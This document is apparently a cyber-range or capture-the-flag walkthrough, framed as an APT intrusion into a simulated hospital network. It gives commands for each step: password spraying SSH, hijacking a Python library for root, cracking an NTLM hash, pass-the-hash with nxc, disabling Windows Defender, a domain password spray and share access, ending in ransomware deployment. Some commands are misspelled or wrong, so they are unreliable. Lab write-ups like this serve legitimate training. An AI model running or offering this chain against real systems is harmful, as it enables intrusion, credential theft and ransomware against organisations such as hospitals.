The APT group Midnight Hydra recently targeted https://hospital.targets.breachsimrange.io, a leading hospital in the adversary city and recognized for its robust cybersecurity measures. The hospital had recently publicized its advancements in security protocols, specifically aimed at mitigating ransomware threats and enhancing encryption practices for sensitive medical data.

Challenged by these advancements, Midnight Hydra commenced their operation with deep external reconnaissance. By leveraging dark web intelligence and underground forums, they sought compromised credentials that could be exploited to gain access to the hospital’s systems.

Their investigation proved successful when they acquired SSH credentials associated with an different ldap id accounts at hospital . These credentials, previously obtained from a disparate data breach, were now available on illicit marketplaces. Seizing this opportunity, Midnight Hydra proceeded to exploit the compromised credentials.

Upon discovering that the previously mentioned portals are no longer accessible, The attacker conducted a port scan on https://hospital.targets.breachsimrange.io. The scan revealed that port 22, used for SSH, was exposed. We proceeded with a password spraying attack targeting the user account op_user. This effort was successful, and gained SSH access using one of the tested passwords.

ssh op_user@hospital.targets.breachsimrange.io

Password: op_user@123

The command below gives the cidr range and internal ip of the server

ip addr

During our initial authenticated enumeration for privilege escalation, we identified some files that appeared interesting but ultimately proved to be of no use. We then proceeded to check the level of sudo privileges the user possessed by executing the relevant command.

sudo -l
ls -la   /usr/local/bin/python3.8/

We discovered that the user had sudo privileges to execute a Python script that controls the Vault agent using Python 3.8 and encodes authentication information. Upon investigating how the modules were being called and noting the specified Python interpreter version, we explored the possibility of library hijacking. The Vault agent control script was invoking the base64 module, and we found that we had read and execute permissions on the actual module path. /usr/local/bin/python3.8/base64.py

We tried hijacking the library:

import os

os.system('id')

We executed the Vault service agent controller Python script with sudo privileges using the specified interpreter. This successfully confirmed the library hijacking, allowing us to operate as the root user and obtain whatever we needed with elevated privileges.

Similarly, we targeted the contents of the root directory by inserting the following Python script to hijack the base64 library, enabling us to read the contents within the /root directory.Comment

import os

os.system('cat /root')

Upon analyzing the contents of the Vault directory, we discovered several items, including vault.conf, certificates, and a shell script. The shell script is configured to load using the configuration file, which contains an NTLM hash (F4E0E33DE45F6F09AAABD3E2C981D181), the username sys_mgmt, and the machine IP 172.31.32.130 of the Vault server. This configuration suggests that the Vault agent connects to the Vault server to retrieve application secrets using certificate-based authentication.

By submitting the NTLM hash to CrackStation, we successfully cracked the password of a domain user associated with the Vault server connection. Leveraging this information, we utilized the cracked credentials with the nxc-integrated Evil-WinRM tool to achieve command execution via a pass-the-hash technique.

nxc smb 172.31.32.130 -u sys_mgmt -H F4E0E33DE45F6F09AAABD3E2C981D181 

nxc winrm 172.31.32.130 -u sys_mgmt -H F4E0E33DE45F6F09AAABD3E2C981D181 -X whoami

Then we enumerated if there is any antivirus solutions on the vault server , we used the following command

nxc smb 172.31.32.130 -u sys_mgmt -H F4E0E33DE45F6F09AAABD3E2C981D181 -M enum_av

We also enumerated the shares available and gone through the public shares using the commands below

smbclient -L //172.31.32.130/ -U HOSPITAL\sys_mgmt
smbclient -L //[172.31.32.130/](http://172.31.32.130/)

smbclient //172.31.32.130/Public

We retrieved the sysadmin-config_server.ps1 file, which contained some configuration code along with the public IP address of a server. The public IP was identified as 23.23.39.159. We then attempted to establish an RDP connection to the Vault server using xfreerdp

xfreerdp /v:23.23.39.159 /u:sys_mgmt /p:Log2domain

This confirmed that the user sys_mgmt is a local administrator on the Vault server, though only a standard domain user. Further enumeration led us to discover certain files containing application secrets and a PowerShell script (ps1) that loads sensitive data from a Domain Controller share located at \\172.31.37.193\Restricted, which was inaccessible to regular domain users.

Given these findings, we decided to attempt a domain password spray. To start, we executed the PowerShell script using the following command:

. .\spray.ps1

It was flagged by the Anti Virus Windows Defender. So as a local admin we disable real time monitoring by the following command.

Set-MpPrefernce -DisableRealMonitoring 1

Then we started domain spray with the following command against all users

Invoke-DomainPasswordSpray -Password Hospital@123

And indeed, we obtained a successful hit for a user. Although the user was not a domain administrator, they held elevated privileges. We then used smbclient to attempt a connection to the domain share with the identified credentials. Authentication was successful, granting us access to the share, which was restricted to domain administrators and this single privileged user

smbclient //172.31.37.193/Restricted/ -U “HOSPITAL\vuser”

Password: Hospital@123

The final flag is kept at the share with name “flag_final.txt”

The APT group exploited the writable share by uploading a malicious binary executable named “Rock.exe.” This executable was subsequently run by a domain administrator, leading to a widespread ransomware attack across the entire domain.
